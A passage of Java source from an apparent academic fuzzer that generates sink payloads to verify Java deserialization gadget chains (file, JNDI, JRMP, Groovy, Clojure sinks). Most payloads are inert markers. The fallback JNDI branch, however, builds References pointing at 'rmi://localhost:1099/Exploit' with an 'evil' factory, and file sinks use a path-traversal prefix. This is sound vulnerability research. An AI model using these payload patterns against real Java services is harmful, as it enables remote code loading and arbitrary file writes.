package cn.edu.fudan.generator.sink;

import cn.edu.fudan.container.GlobalDataContainer;
import cn.edu.fudan.container.ValidatorGlobalDataContainer;
import cn.edu.fudan.datastructure.OracleClassA;
import cn.edu.fudan.exception.validator.GeneratorException;
import cn.edu.fudan.exception.validator.ReflectionException;
import cn.edu.fudan.exception.validator.SinkPayloadsGeneratorException;
import cn.edu.fudan.generator.seed.SeedGenerator;
import cn.edu.fudan.utils.ClassUtils;
import cn.edu.fudan.utils.CommonUtils;
import cn.edu.fudan.utils.FuzzUtils;
import cn.edu.fudan.utils.LogUtils;
import cn.edu.fudan.utils.ReflectionUtils;
import datastructrue.Pair;
import datastructrue.inst.JDDFuzzRecord;
import datastructrue.iocd.IOCD;
import datastructrue.iocd.unit.ClassRecord;
import datastructrue.iocd.unit.FieldRecord;
import datastructrue.iocd.unit.MethodRecord;
import datastructrue.iocd.unit.SinkRecord;

import java.io.File;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class SinkPayloadsGenerator {

    // Notice: 不要动第一个元素，因为第一个元素是默认的路径
    // the FILE payload directory, as an absolute path and through a path traversal
    private static final ArrayList<String> PATH_CANDIDATE = new ArrayList<>(Arrays.asList(
            JDDFuzzRecord.EVIL_FILE_DIR, "../../../../../../../.." + JDDFuzzRecord.EVIL_FILE_DIR
    ));

    // File name for the 2nd and later path fields of a sink. In every FILE sink of the IOCD datasets the
    // path is built as <dir field> + File.separator + <name field> (e.g. StoreableCachingMap: folder + key),
    // so giving every field a full PATH_CANDIDATE yields "/tmp/jdd_evil_file/../../tmp/jdd_evil_file", i.e.
    // the directory itself, and the write can never succeed. The name is unique per fuzzer process so that
    // parallel fuzzers do not see each other's files (JDDFuzzRecord.confirmFileOracle).
    private static final String EVIL_FILE_NAME = "jdd_evil_file_"
            + java.lang.management.ManagementFactory.getRuntimeMXBean().getName().split("@")[0];

    private static final String EVIL_RMI = "rmi://localhost:1099/Exploit";
    private static final String EVIL_FACTORY = "evil";

    // 是简单地进行invoke类型Gadget的方法调用验证还是生成完全可利用的invoke类型Gadget
    public static boolean isFullInvokeGadget = false;
    // 后续用于动态链接invoke方法用的Class
    public static Class<?> invokeGadgetClass = null;
    public static String invokeGadgetMethodName = null;


    // see `SinkPayloadsGenerator#genInvokeSinkPayload` and `SinkRecord.sinkClassBelongToF`
    public static Map<String, FieldRecord> crtSinkClassBelongToObjKey = new HashMap<>();

    /**
     * generate payload set according to sink seedType
     *
     * @param sinkType
     * @param sinkRcd
     * @return
     * @throws SinkPayloadsGeneratorException
     */
    public static ArrayList<Pair<String, Object>> genSinkPayloadsList(SinkTypeEnum.SinkType sinkType, SinkRecord sinkRcd) throws GeneratorException, ReflectionException {
        return genSinkPayloadsList(sinkType, sinkRcd, -1);
    }

    public static ArrayList<Pair<String, Object>> genSinkPayloadsList(SinkTypeEnum.SinkType sinkType, SinkRecord sinkRcd, int iocdHash) throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList;
        switch (sinkType) {
            case FILE:
                resList = genFileSinkPayload(sinkRcd);
                break;
            case INVOKE:
                resList = genInvokeSinkPayload(sinkRcd);
                break;
            case EXPRESSION_INJECTION:
                resList = genExpressionInjectionSinkPayload(sinkRcd);
                break;
            case GROOVY:
                resList = genGroovySinkPayload(sinkRcd);
                break;
            case CLOJURE:
                resList = genClojureSinkPayload(sinkRcd, iocdHash);
                break;
            case JNDI:
                resList = genJNDISinkPayload(sinkRcd, iocdHash);
                break;
            case CUSTOM:
                resList = genCustomSinkPayload(sinkRcd, iocdHash);
                break;
            default:
                throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genSinkPayloadsWrapper: " +
                        "unknown sink seedType: " + sinkType);
        }
        return resList;
    }

    private static ArrayList<Pair<String, Object>> genGroovySinkPayload(SinkRecord sinkRcd) throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();

        String sinkClassName = sinkRcd.getSinkClassName();
        MethodRecord sinkMtd = sinkRcd.getSinkMethod();

        if (sinkClassName.equals(ClassUtils.GROOVY_GSTRING)) {
            if (sinkMtd.getSig().equals(ClassUtils.GROOVY_GSTRING_WRITE_TO)) {
                HashSet<Pair<Integer, FieldRecord>> fldRcdPairs = sinkRcd.getSinkField();
                Pair<Integer, FieldRecord> fldRcdPair = fldRcdPairs.iterator().next();
                FieldRecord fldRcd = fldRcdPair.getValue();
                String fieldType = fldRcd.getFieldType();
                String fieldName = fldRcd.getFieldName();
                if (ClassUtils.isArrayTypeSoot(fieldType) && fieldName.equals("values")) {
                    try {
                        Object sinkObj = generateGroovyMethodClosure();
                        resList.add(new Pair<>(getFldSigWithID(fldRcd), new Object[] {sinkObj}));
                    } catch (Exception e) {
                        throw new GeneratorException(e.getMessage(), e);
                    }
                } else {
                    LogUtils.warn("Cannot handle this groovy case now: " + sinkMtd.getSig());
                }

            } else {
                LogUtils.warn("SinkPayloadsGenerator.genGroovySinkPayload: " +
                        "unknown sink method signature: " + sinkMtd.getSig());
            }
        }

        return resList;
    }

    private static ArrayList<Pair<String, Object>> genExpressionInjectionSinkPayload(SinkRecord sinkRcd) throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        return resList;
    }

    // CLOJURE (clojure.main/eval-opt, argument 0 is source text): reachability + field control, nothing evaluated.
    // The field the IOCD carries into argument 0 gets the marker as one clojure string literal, which reads and
    // evaluates to that same string; the marker oracle checks argument 0 at eval-opt's entry. Proxies whose
    // functions call eval-opt get the same literal, see SinkPayloadsWrapper.handleClojureProxies.
    private static ArrayList<Pair<String, Object>> genClojureSinkPayload(SinkRecord sinkRcd, int iocdHash) throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        String marker = FuzzUtils.getReachMarker(iocdHash);
        JDDFuzzRecord.expectedMarker = marker;
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            FieldRecord fr = p.getValue();
            if (p.getKey() == 0 && STRING_HOLDER_TYPES.contains(fr.getFieldType())) {
                resList.add(new Pair<>(getFldSigWithBelongTo(fr), getClojureMarkerLiteral(marker)));
            }
        }
        return resList;
    }

    private static final Set<String> STRING_HOLDER_TYPES = new HashSet<>(Arrays.asList(
            "java.lang.Object", "java.lang.String", "java.lang.CharSequence"));

    public static String getClojureMarkerLiteral(String marker) {
        return "\"" + marker + "\"";   // [A-Za-z0-9-] only, nothing to escape
    }

    // "<sig>#<classId>", plus "#<classBelongTo>" when the field is declared on a superclass of the object's class
    private static String getFldSigWithBelongTo(FieldRecord fr) {
        String key = getFldSigWithID(fr);
        String declaring = CommonUtils.getDeclaredClzBySig(fr.getSig());
        return fr.getClassBelongTo() != null && !fr.getClassBelongTo().equals(declaring) ? key + "#" + fr.getClassBelongTo() : key;
    }

    // CUSTOM sinks (groovy closure call, EL getValue, fastjson2 ObjectWriter.write, ...). The per-family
    // payloads are wired in later; for now this stub lets a CUSTOM IOCD build a seed and run inertly (it
    // reaches no sink, so it is counted as not-verified) instead of failing seed generation.
    private static ArrayList<Pair<String, Object>> genCustomSinkPayload(SinkRecord sinkRcd, int iocdHash) throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        // groovy closure call (groovy.lang.Closure.call): the sink call site is a Closure held in a field of the
        // chain's last class. The field is chosen by its signature and type, never by iterating a set and taking
        // the first (a record can list several fields, only some of which carry the closure).
        String sinkCall = sinkRcd.jimpleUnitInfo == null ? "" : sinkRcd.jimpleUnitInfo;
        if (sinkCall.contains("<javax.el.ValueExpression: ") || sinkCall.contains("<bsh.This: ") || sinkCall.contains("<bsh.XThis: ")) {
            return genCustomMarkerPayload(sinkRcd, iocdHash, sinkCall);
        }
        boolean isGroovy = sinkCall.contains("groovy.lang.Closure");
        if (!isGroovy) {
            // fastjson2 (ObjectWriter.write) has no sink field: its probe goes into the JSON container, see
            // SinkPayloadsWrapper.handleFastjsonSink
            return resList;
        }
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            FieldRecord fr = p.getValue();
            String type = fr.getFieldType();
            if ("groovy.lang.Closure".equals(type)) {
                resList.add(new Pair<>(getFldSigWithID(fr), generateProbeMethodClosure()));
            } else if ("groovy.lang.GString".equals(fr.getClassBelongTo()) && "values".equals(fr.getFieldName())
                    && "java.lang.Object[]".equals(type)) {
                // GString.writeTo calls a Closure found in `values`
                resList.add(new Pair<>(getFldSigWithID(fr), new Object[] {generateProbeMethodClosure()}));
            } else if ("delegate".equals(fr.getFieldName()) && isSubclassOf(fr.getClassBelongTo(), GROOVY_CONVERSION_HANDLER)) {
                // a proxy handler (ConvertedClosure, ConvertedMap) calls the Closure in `delegate`: ConvertedClosure
                // holds the Closure itself, ConvertedMap a Map from the invoked method's name to the Closure. The
                // field is declared on ConversionHandler, so the key names the handler's own class.
                Object payload = isSubclassOf(fr.getClassBelongTo(), GROOVY_CONVERTED_MAP)
                        ? genProbeClosureMap(iocdHash) : generateProbeMethodClosure();
                resList.add(new Pair<>(getFldSigWithID(fr) + "#" + fr.getClassBelongTo(), payload));
            }
        }
        return resList;
    }

    // CUSTOM families verified by reachability + control of the sink's receiver (marker oracle), nothing evaluated:
    //  - EL ValueExpression.getValue (Myfaces): the receiver field gets MyFaces' literal-text expression holding the
    //    marker (getValue returns the text itself; no expression engine is involved);
    //  - BeanShell This.invokeMethod: the receiver field gets an XThis over an empty namespace named by the marker
    //    (it has no methods, so nothing can be invoked).
    private static ArrayList<Pair<String, Object>> genCustomMarkerPayload(SinkRecord sinkRcd, int iocdHash, String sinkCall) throws GeneratorException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        String marker = FuzzUtils.getReachMarker(iocdHash);
        boolean isEL = sinkCall.contains("<javax.el.ValueExpression: ");
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            FieldRecord fr = p.getValue();
            if (p.getKey() != -1) {
                continue;
            }
            try {
                Object payload;
                if (isEL && "javax.el.ValueExpression".equals(fr.getFieldType())) {
                    payload = ReflectionUtils.createWithConstructor(
                            ClassUtils.wrapperClassForName("org.apache.myfaces.view.facelets.el.ELText$LiteralValueExpression"),
                            new Class[]{String.class}, new Object[]{marker});
                } else if (!isEL && ("bsh.XThis".equals(fr.getFieldType()) || "bsh.This".equals(fr.getFieldType()))) {
                    Class<?> nsClz = ClassUtils.wrapperClassForName("bsh.NameSpace");
                    Object ns = ReflectionUtils.createWithConstructor(nsClz, new Class[]{nsClz, String.class}, new Object[]{null, marker});
                    payload = ReflectionUtils.createWithConstructor(ClassUtils.wrapperClassForName("bsh.XThis"),
                            new Class[]{nsClz, ClassUtils.wrapperClassForName("bsh.Interpreter")}, new Object[]{ns, null});
                } else {
                    continue;
                }
                resList.add(new Pair<>(getFldSigWithBelongTo(fr), payload));
            } catch (Exception e) {
                throw new GeneratorException("In `genCustomMarkerPayload`: " + e, e);
            }
        }
        if (!resList.isEmpty()) {
            JDDFuzzRecord.expectedMarker = marker;
        }
        return resList;
    }

    private static final String GROOVY_CONVERSION_HANDLER = "org.codehaus.groovy.runtime.ConversionHandler";
    private static final String GROOVY_CONVERTED_MAP = "org.codehaus.groovy.runtime.ConvertedMap";

    private static boolean isSubclassOf(String clzName, String superName) {
        try {
            ClassLoader loader = ClassLoader.getSystemClassLoader();
            return Class.forName(superName, false, loader).isAssignableFrom(Class.forName(clzName, false, loader));
        } catch (Throwable e) {
            return false;
        }
    }

    // method name -> probe closure, for every method of the interfaces the IOCD's proxies implement: the method a
    // ConvertedMap proxy is invoked with comes from the chain, not from the sink record
    private static HashMap<String, Object> genProbeClosureMap(int iocdHash) throws ReflectionException {
        HashMap<String, Object> res = new HashMap<>();
        IOCD iocd = GlobalDataContainer.getIOCDByHash(iocdHash);
        if (iocd == null) {
            return res;
        }
        Object closure = generateProbeMethodClosure();
        for (ClassRecord clzRcd : iocd.getGadgetClasses()) {
            if (!clzRcd.isProxy) {
                continue;
            }
            for (String name : clzRcd.addProxyInterface) {
                try {
                    Class<?> itf = Class.forName(name, false, ClassLoader.getSystemClassLoader());
                    if (itf.isInterface()) {
                        for (java.lang.reflect.Method m : itf.getMethods()) {
                            res.put(m.getName(), closure);
                        }
                    }
                } catch (Throwable e) {
                    LogUtils.warn("In `genProbeClosureMap`: can not load proxy interface " + name + ": " + e);
                }
            }
        }
        return res;
    }

    // A groovy MethodClosure whose owner is the fuzzer's own no-op probe (OracleClassA) and whose method is the
    // probe method: calling the closure calls the probe, which records that the sink was really reached. Unlike
    // the dead generateGroovyMethodClosure below, nothing else is executed.
    private static Object generateProbeMethodClosure() throws ReflectionException {
        try {
            return ReflectionUtils.createWithConstructor(
                    ClassUtils.wrapperClassForName(ClassUtils.GROOVY_METHOD_CLOSURE),
                    new Class[] {Object.class, String.class},
                    new Object[] {new OracleClassA(), "anOracleMethod"});
        } catch (ClassNotFoundException e) {
            throw new ReflectionException("groovy MethodClosure is not on the classpath: " + e.getMessage());
        }
    }

    // Spring JNDI lookup family: the sink is <org.springframework.jndi.JndiTemplate: Object lookup(String,
    // Class)>, reached via SimpleJndiBeanFactory.getBean -> JndiLocatorSupport.lookup. The looked-up NAME is
    // the IOCD's key-0 String field (AbstractBeanFactoryPointcutAdvisor.adviceBeanName / PropertyPathFactory
    // Bean.targetBeanName); we set it to this run's inert marker token. The key -1 field is the receiver
    // (JndiAccessor.jndiTemplate on a SimpleJndiBeanFactory): it must be a real JndiTemplate or the call
    // NPEs before the sink. The marker name cannot resolve (no initial context factory), so lookup throws
    // NoInitialContextException after entry; nothing is contacted. SimpleJndiBeanFactory.shareableResources
    // is primed with the same token in SinkPayloadsWrapper.handleJNDISinkObj so getAdvice reaches the sink.
    private static final String SPRING_JNDI_TEMPLATE = "org.springframework.jndi.JndiTemplate";

    private static boolean isSpringJndiLookup(SinkRecord sinkRcd) {
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            String sig = p.getValue().getSig();
            if (sig != null && sig.contains(SPRING_JNDI_TEMPLATE + " jndiTemplate")) {
                return true;
            }
        }
        return false;
    }

    private static ArrayList<Pair<String, Object>> genSpringJndiLookupPayload(SinkRecord sinkRcd, int iocdHash)
            throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        String marker = cn.edu.fudan.utils.FuzzUtils.getReachMarker(iocdHash); // JDD-REACH-<hash>, [A-Za-z0-9-]
        JDDFuzzRecord.expectedMarker = marker;   // what the marker oracle looks for at the sink
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            int key = p.getKey();
            FieldRecord fr = p.getValue();
            if (!ValidatorGlobalDataContainer.isFieldSettableByFieldSig(fr.getSig())) {
                continue;
            }
            if (key >= 0 && "java.lang.String".equals(fr.getFieldType())) {
                // the looked-up name
                resList.add(new Pair<>(getFldSigWithID(fr), marker));
            } else if (key == -1 && SPRING_JNDI_TEMPLATE.equals(fr.getFieldType())) {
                // the receiver: a real JndiTemplate with a null environment (so no initial context factory
                // is ever read). The target object is the sink record's classBelongTo (SimpleJndiBeanFactory),
                // not the field's declaring class (JndiAccessor) which the seed has no object for; carry it
                // as a third '#'-component so doSinkPayloadSetting0 sets the field on the right object.
                Object jt = ReflectionUtils.createWithNoArgsConstructor(SPRING_JNDI_TEMPLATE);
                ReflectionUtils.setFieldValue(jt, "environment", null);
                resList.add(new Pair<>(getFldSigWithID(fr) + "#" + fr.getClassBelongTo(), jt));
            }
        }
        return resList;
    }

    // NamingManager.getObjectInstance family (XBean ReadOnlyBinding.getObject, Resin ContinuationContext): the
    // sink argument 0 is the object being resolved, held in the IOCD's sinkField (ReadOnlyBinding.value /
    // NamingException.resolvedObj). The payload is a javax.naming.Reference whose className is this run's inert
    // marker. Its factory class name is non-null and cannot resolve, so getObjectInstance takes the factory
    // branch, fails to load it and returns the Reference unchanged: no address is processed, nothing is
    // loaded or contacted. The marker is read at entry from Reference.getClassName().
    private static final String INERT_FACTORY = "jdd-no-such-factory";

    private static boolean isNamingManagerGetObjectInstance(SinkRecord sinkRcd) {
        String jimple = sinkRcd.jimpleUnitInfo;
        return jimple != null && jimple.contains("javax.naming.spi.NamingManager")
                && jimple.contains("getObjectInstance");
    }

    private static ArrayList<Pair<String, Object>> genGetObjectInstancePayload(SinkRecord sinkRcd, int iocdHash)
            throws GeneratorException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            FieldRecord fr = p.getValue();
            // the Object-typed carrier of the resolved object; the record's other entries (if any) are not it
            if (!"java.lang.Object".equals(fr.getFieldType())) {
                continue;
            }
            String marker = cn.edu.fudan.utils.FuzzUtils.getReachMarker(iocdHash);
            JDDFuzzRecord.expectedMarker = marker;   // what the marker oracle looks for at the sink
            javax.naming.Reference ref = new javax.naming.Reference(marker, INERT_FACTORY, null);
            // inertness is asserted, not assumed: a null factory name or any address would let the
            // resolution leave the factory branch
            if (ref.getFactoryClassName() == null || ref.size() != 0 || ref.getFactoryClassLocation() != null) {
                throw new SinkPayloadsGeneratorException("getObjectInstance marker Reference is not inert");
            }
            resList.add(new Pair<>(getFldSigWithID(fr), ref));
            break;
        }
        return resList;
    }

    // InetAddress.getByName(String) family (app JDK: java.net.URL.hashCode -> URLStreamHandler.getHostAddress ->
    // URL.getHostAddress -> getByName, and one JMXServiceURL.validateHost). The sink argument is the URL's host
    // string; we set it to an inert IPv6 documentation-range literal carrying the iocd hash. A literal is parsed,
    // not resolved, so no lookup happens. A URL read back from a stream rebuilds itself from its other fields, so
    // they are set and pinned too, as the sink record's host field alone would be lost or abort the read:
    // authority (the host is derived from it), port -1 (any other negative port is rejected), protocol "http"
    // (a builtin handler), and hashCode -1 (so URL.hashCode() computes the hash instead of returning 0).
    private static boolean isInetAddressGetByName(SinkRecord sinkRcd) {
        String jimple = sinkRcd.jimpleUnitInfo;
        return jimple != null && jimple.contains("<java.net.InetAddress: java.net.InetAddress getByName(java.lang.String)>");
    }

    private static ArrayList<Pair<String, Object>> genInetAddressGetByNamePayload(SinkRecord sinkRcd, int iocdHash) {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        String core = cn.edu.fudan.utils.FuzzUtils.getReachHostMarker(iocdHash);
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            FieldRecord fr = p.getValue();
            if (!"host".equals(fr.getFieldName()) || !"java.lang.String".equals(fr.getFieldType())) {
                continue;
            }
            String clz = fr.getClassBelongTo();
            if ("java.net.URL".equals(clz)) {
                // a URL host holds an IPv6 literal in brackets
                String bracketed = "[" + core + "]";
                String id = "#" + fr.getClassId();
                resList.add(new Pair<>(getFldSigWithID(fr), bracketed));
                resList.add(new Pair<>("<java.net.URL: java.lang.String authority>" + id, bracketed));
                resList.add(new Pair<>("<java.net.URL: int port>" + id, Integer.valueOf(-1)));
                resList.add(new Pair<>("<java.net.URL: java.lang.String protocol>" + id, "http"));
                resList.add(new Pair<>("<java.net.URL: int hashCode>" + id, Integer.valueOf(-1)));
            } else if ("javax.management.remote.JMXServiceURL".equals(clz)) {
                // validateHost only calls getByName for a bare numeric IPv6 address
                resList.add(new Pair<>(getFldSigWithID(fr), core));
            } else {
                continue;
            }
            JDDFuzzRecord.expectedMarker = core;
            break;
        }
        return resList;
    }

    // JRMP sinks (app JDK). UnicastRef.newCall is JRMPClient: UnicastRef.readExternal -> LiveRef.read ->
    // DGCClient.registerRefs -> ... -> DGCImpl_Stub.dirty -> newCall, a call to the endpoint read from the stream.
    // UnicastServerRef.exportObject is JRMPListener: UnicastRemoteObject.readObject -> reexport -> exportObject(this,
    // port), an export on the port read from the stream. Neither sink is a name that can be resolved or a file, so the
    // markers are inert values (see FuzzUtils.getReachJrmpHostMarker / getReachJrmpPortMarker).
    private static boolean isSinkMethodOf(SinkRecord sinkRcd, String sigPrefix) {
        return sinkRcd.sinkMethod != null && sinkRcd.sinkMethod.sig != null && sinkRcd.sinkMethod.sig.startsWith(sigPrefix);
    }

    private static boolean isUnicastRefNewCall(SinkRecord sinkRcd) {
        return isSinkMethodOf(sinkRcd, "<sun.rmi.server.UnicastRef: java.rmi.server.RemoteCall newCall(");
    }

    private static boolean isUnicastServerRefExportObject(SinkRecord sinkRcd) {
        return isSinkMethodOf(sinkRcd, "<sun.rmi.server.UnicastServerRef: java.rmi.Remote exportObject(");
    }

    // JRMPClient: the UnicastRef of the seed is serialized with its LiveRef (writeExternal) and read back by
    // readExternal, which registers it with the DGC client; the DGC call goes to the endpoint of that LiveRef. So the
    // sink field `ref` is set to a LiveRef whose endpoint host is the marker.
    private static ArrayList<Pair<String, Object>> genJrmpClientPayload(SinkRecord sinkRcd, int iocdHash) throws GeneratorException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        for (Pair<Integer, FieldRecord> p : sinkRcd.getSinkField()) {
            FieldRecord fr = p.getValue();
            if (!"ref".equals(fr.getFieldName()) || !"sun.rmi.transport.LiveRef".equals(fr.getFieldType())) {
                continue;
            }
            String key = jrmpFieldKey(iocdHash, fr.getSig(), "sun.rmi.server.UnicastRef");
            if (key == null) {
                continue;
            }
            String host = FuzzUtils.getReachJrmpHostMarker(iocdHash);
            try {
                Object endpoint = ReflectionUtils.createWithConstructor(Class.forName("sun.rmi.transport.tcp.TCPEndpoint"),
                        new Class[]{String.class, int.class}, new Object[]{host, FuzzUtils.getReachJrmpPortMarker(iocdHash)});
                Object liveRef = ReflectionUtils.createWithConstructor(Class.forName("sun.rmi.transport.LiveRef"),
                        new Class[]{java.rmi.server.ObjID.class, Class.forName("sun.rmi.transport.Endpoint"), boolean.class},
                        new Object[]{new java.rmi.server.ObjID(0), endpoint, Boolean.FALSE});
                resList.add(new Pair<>(key, liveRef));
            } catch (ClassNotFoundException | ReflectionException e) {
                throw new SinkPayloadsGeneratorException("Cannot build the JRMP endpoint marker: " + e.getMessage(), e);
            }
            JDDFuzzRecord.expectedMarker = host + ":";     // LiveRef.getChannel is entered on "<host>:<port>"
            break;
        }
        return resList;
    }

    // JRMPListener: UnicastRemoteObject.reexport builds the UnicastServerRef from the field `port`, so the sink
    // payload is the marker port in that field (the sink record's own field, UnicastServerRef.ref, is made inside).
    private static ArrayList<Pair<String, Object>> genJrmpListenerPayload(SinkRecord sinkRcd, int iocdHash) {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        String key = jrmpFieldKey(iocdHash, "<java.rmi.server.UnicastRemoteObject: int port>", "java.rmi.server.UnicastRemoteObject");
        if (key != null) {
            int port = FuzzUtils.getReachJrmpPortMarker(iocdHash);
            resList.add(new Pair<>(key, Integer.valueOf(port)));
            JDDFuzzRecord.expectedMarker = ":" + port;     // LiveRef.exportObject is entered on "<host>:<port>"
        }
        return resList;
    }

    // "<sig>#<classId>" of a field declared by `declaring`, held by the IOCD's gadget object of that class, or else of
    // a subclass of it (e.g. UnicastRef.ref of a UnicastRef2, UnicastRemoteObject.port of an ActivationGroupImpl), with
    // "#<that class>" appended then (see SinkPayloadsWrapper.doSinkPayloadSetting0); null if the IOCD has neither.
    private static String jrmpFieldKey(int iocdHash, String fieldSig, String declaring) {
        IOCD iocd = GlobalDataContainer.getIOCDByHash(iocdHash);
        if (iocd == null) {
            return null;
        }
        ClassRecord holder = null;
        for (ClassRecord clzRcd : iocd.getGadgetClasses()) {
            if (declaring.equals(clzRcd.getClassName())) {
                holder = clzRcd;
                break;
            }
        }
        if (holder == null) {
            for (ClassRecord clzRcd : iocd.getGadgetClasses()) {
                if (isSubclassOf(clzRcd.getClassName(), declaring)) {
                    holder = clzRcd;
                    break;
                }
            }
        }
        if (holder == null) {
            return null;
        }
        String key = fieldSig + "#" + holder.getId();
        return declaring.equals(holder.getClassName()) ? key : key + "#" + holder.getClassName();
    }

    private static ArrayList<Pair<String, Object>> genJNDISinkPayload(SinkRecord sinkRcd, int iocdHash) throws GeneratorException, ReflectionException {
        if (isSpringJndiLookup(sinkRcd)) {
            return genSpringJndiLookupPayload(sinkRcd, iocdHash);
        }
        if (isNamingManagerGetObjectInstance(sinkRcd)) {
            return genGetObjectInstancePayload(sinkRcd, iocdHash);
        }
        if (isInetAddressGetByName(sinkRcd)) {
            return genInetAddressGetByNamePayload(sinkRcd, iocdHash);
        }
        if (isUnicastRefNewCall(sinkRcd)) {
            return genJrmpClientPayload(sinkRcd, iocdHash);
        }
        if (isUnicastServerRefExportObject(sinkRcd)) {
            return genJrmpListenerPayload(sinkRcd, iocdHash);
        }
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();

        try {
            HashSet<Pair<Integer, FieldRecord>> sinkFldPairs = sinkRcd.getSinkField();
            Pair<Integer, FieldRecord> fldRcdPair = sinkFldPairs.iterator().next();
            FieldRecord fldRcd = fldRcdPair.getValue();
            String fldType = fldRcd.getFieldType();
            String fldSigWithId = getFldSigWithID(fldRcd);
            if (ClassUtils.isJdkObject(fldType)) {
                String clzBelongToName = fldRcd.getClassBelongTo();
                String fldName = fldRcd.getFieldName();
                if (clzBelongToName.equals(FuzzUtils.XBEAN_READ_ONLY_BINDING) && fldName.equals("value")) {
                    String randomStr = CommonUtils.generateRandomString();
                    Object sinkObj = ReflectionUtils.createWithConstructor(
                            ClassUtils.wrapperClassForName(FuzzUtils.JAVAX_NAMING_REF),
                            new Class[]{String.class, String.class, String.class},
                            new Object[] {randomStr, EVIL_RMI, EVIL_FACTORY});
                    Pair<String, Object> sinkPayloadPair = new Pair<>(fldSigWithId, sinkObj);
                    resList.add(sinkPayloadPair);
                } else {
                    String randomStr = CommonUtils.generateRandomString();
                    Object sinkObj = ReflectionUtils.createWithConstructor(
                            ClassUtils.wrapperClassForName(FuzzUtils.JAVAX_NAMING_REF),
                            new Class[]{String.class, String.class, String.class},
                            new Object[] {randomStr, EVIL_RMI, EVIL_FACTORY});
                    Pair<String, Object> sinkPayloadPair = new Pair<>(fldSigWithId, sinkObj);
                    resList.add(sinkPayloadPair);
                }
            }
        } catch (Exception e) {
            if (e instanceof ReflectionException) throw (ReflectionException) e;
            throw new GeneratorException(e.getMessage(), e);
        }

        return resList;
    }

    /**
     * generate sinkRecord related payload set
     *
     * @param sinkRcd
     * @return
     */
    private static ArrayList<Pair<String, Object>> genFileSinkPayload(SinkRecord sinkRcd) throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        // the file path that write the file
        boolean isPathSet = false;
        if (sinkRcd.sinkFilePathF != null) {
            int pathHandled = 0;
            boolean isDirPathSet = false;
            List<FieldRecord> pathFields = serializablePathFields(sinkRcd.sinkFilePathF);
            int potentialPathNum = pathFields.size();
            for (FieldRecord fPathFR : pathFields) {
                // check if field is settable
                if (!ValidatorGlobalDataContainer.isFieldSettableByFieldSig(fPathFR.getSig())) {
                    continue;
                }
                // for multiple file paths, if one of them is set, the exception caused by others will be ignored
                pathHandled++;
                String fldSigWithID = getFldSigWithID(fPathFR);
                String fldType = CommonUtils.getFieldTypeBySig(fldSigWithID);
                Pair<String, Object> fldSigAndPayload = null;
                // Thinking: a straightforward way to handle the `java.lang.Object` field, maybe not the best way
                if (fldType.equals("java.lang.String") || fldType.equals("java.lang.Object")) {
                    // the first path field is the directory, later ones the file name inside it
                    Object sinkObj = assemblePayload(fPathFR, isDirPathSet ? EVIL_FILE_NAME : CommonUtils.getRandomItemFromList(PATH_CANDIDATE));
                    isDirPathSet = true;
                    fldSigAndPayload = new Pair<>(fldSigWithID, sinkObj);
                } else if (fldType.equals("java.io.File")) {
                    Object sinkObj = assemblePayload(fPathFR, new File(PATH_CANDIDATE.get(0)));
                    isDirPathSet = true;
                    fldSigAndPayload = new Pair<>(fldSigWithID, sinkObj);
                } else if (ClassUtils.isSubOrImplClass( "java.io.OutputStream", fldType)) {
                    // if the field is a sub-class of OutputStream, then we try to find a suitable constructor
                    // e.g., constructor with `java.io.File` parameter
                    if (fldType.equals("java.io.OutputStream") || ClassUtils.isSubOrImplClass("java.io.FileOutputStream", fldType)) {
                        LogUtils.warn("Do not support finding suitable constructor for OutputStream now");
                        throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genFileSinkPayload: " +
                            "unknown sink field seedType: " + fldType);
                    } else {
                        try {
                            Constructor<?>[] candidatesConstructor = ReflectionUtils.getAllConstructors(ClassUtils.wrapperClassForName(fldType));
                            Class<?>[] parameterTypes = new Class[0];
                            boolean isFound = false;
                            for (Constructor<?> constructor : candidatesConstructor) {
                                parameterTypes = constructor.getParameterTypes();
                                for (int i = 0; i < parameterTypes.length; i++) {
                                    if (parameterTypes[i].getName().equals("java.io.File")) {
                                        isFound = true;
                                        break;
                                    }
                                }
                                if (isFound) break;
                            }
                            if (isFound) {
                                Object[] args = new Object[parameterTypes.length];
                                for (int i = 0; i < parameterTypes.length; i++) {
                                    if (parameterTypes[i].getName().equals("java.io.File")) {
                                        args[i] = new File(PATH_CANDIDATE.get(0));
                                    } else {
                                        args[i] = SeedGenerator.createObjectWithReflection(parameterTypes[i].getName(), null);
                                    }
                                }
                                Object sinkObj = ReflectionUtils.createWithConstructor(ClassUtils.wrapperClassForName(fldType), parameterTypes, args);
                                fldSigAndPayload = new Pair<>(fldSigWithID, sinkObj);
                            }
                        } catch (Exception | Error e) {
                            throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genFileSinkPayload: " +
                                    "unknown sink field seedType: " + fldType);
                        }
                    }
                }
                if (fldSigAndPayload == null && pathHandled == potentialPathNum && !isPathSet) {
                    throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genFileSinkPayload: " +
                            "unknown sink field seedType: " + fldType);
                }
